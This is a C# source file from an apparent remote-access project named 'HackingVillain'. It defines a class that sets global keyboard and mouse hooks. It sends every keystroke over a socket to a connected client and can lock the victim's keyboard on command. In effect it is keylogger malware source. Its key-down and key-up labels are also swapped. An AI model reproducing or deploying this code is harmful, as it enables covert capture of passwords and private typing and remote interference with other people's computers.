using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Hook;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;
using NetworkData;

using Buffer = AwesomeSockets.Buffers.Buffer;

namespace HackingVillain
{
    public class Hooker : IDisposable
    {
        private bool _keyLock = false;

        private KeyboardHook _key;
        private MouseHook _mouse;
        private ISocket _client;
        public Hooker(ISocket client)
        {
            _client = client;
            _key = new KeyboardHook();
            _mouse = new MouseHook();
            
            _key.KeyDown += _key_KeyDown;
            _key.KeyUp += _key_KeyUp;
            _mouse.MouseDown += _mouse_MouseDown;
            _mouse.MouseUp += _mouse_MouseUp;

            _key.HookStart();
            _mouse.HookStart();
        }

        public void Send(string msg)
        {
            Client.Send(_client, Encoding.UTF8.GetBytes(msg), 2);
        }

        private bool _key_KeyUp(Keys key)
        {
            Send($"Key {key}: Down");
            return !_keyLock;
        }

        private bool _key_KeyDown(Keys key)
        {
            Send($"Key {key}: Up");
            return !_keyLock;
        }

        ~Hooker()
        {
            this.Dispose();
        }

        public void Dispose()
        {
            _key.HookEnd();
            _mouse.HookEnd();
        }

        public void Lock()
        {
            _keyLock = true;
        }

        public void UnLock()
        {
            _keyLock = false;
        }

        private bool _mouse_MouseUp(MouseEventType arg1, int arg2, int arg3)
        {
            return true;
        }

        private bool _mouse_MouseDown(MouseEventType arg1, int arg2, int arg3)
        {
            return true;
        }
    }
}
